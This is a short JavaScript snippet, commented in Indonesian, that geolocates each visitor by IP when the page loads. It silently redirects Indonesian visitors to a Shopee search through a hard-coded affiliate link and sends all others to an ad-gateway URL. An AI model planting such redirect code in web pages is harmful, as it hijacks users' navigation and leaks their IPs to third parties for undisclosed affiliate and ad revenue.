// Ambil parameter dari URL
const urlParams = new URLSearchParams(window.location.search);
const queryParam = urlParams.get('q');
const slugParam = urlParams.get('slug');

// Fungsi untuk mendapatkan informasi IP dari ipwhois
function getCountryFromIP(ip) {
  return fetch(`https://ipwhois.app/json/${ip}`)
    .then(response => response.json())
    .then(data => data.country_code)
    .catch(error => console.log(error));
}

// Redirect URL berdasarkan negara pengguna
async function redirectByCountry() {
  const response = await fetch('https://api.ipify.org/?format=json');
  const data = await response.json();
  const countryCode = await getCountryFromIP(data.ip);

  if (countryCode === 'ID') {
    const keyword = queryParam || slugParam;
    const redirectURL = `https://shopee.co.id/search?filters=5%2C6%2C7&keyword=${encodeURIComponent(keyword)}`;
    window.location.href = `https://shopee.ee/an_redir?origin_link=${encodeURIComponent(redirectURL)}&affiliate_id=11369620275&sub_id=RacunBelanja-14-03-20-23`;
  } else {
    window.location.href = 'https://www.highrevenuegate.com/ix4w14mn00?key=0647c1ed9e0e63fde67b1b37272c2227';
  }
}

// Jalankan fungsi untuk melakukan redirect
redirectByCountry();
